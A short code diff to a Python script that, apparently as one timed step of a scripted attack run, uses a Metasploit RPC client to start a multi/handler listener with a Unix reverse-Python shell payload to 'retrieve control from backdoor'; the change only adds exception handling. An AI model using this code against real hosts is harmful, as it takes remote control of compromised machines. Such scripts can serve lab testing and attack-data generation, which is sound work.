@@ -22,14 +22,17 @@ def main(argv):
     record_timestamp(folder, output_time_file_start)
     time.sleep(60)
 
-    # Retrieve control from backdoor
-    exploit = client.modules.use('exploit', 'multi/handler')
-    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
-    payload['LHOST'] = my_ip
+    try:
+        # Retrieve control from backdoor
+        exploit = client.modules.use('exploit', 'multi/handler')
+        payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+        payload['LHOST'] = my_ip
 
-    exploit.execute(payload=payload)
-
-
+        exploit.execute(payload=payload)
+        
+    except Exception as e:
+        print(e)
+        pass
 
     time.sleep(30)
     output_time_file_end = 'time_step_6_end.txt'
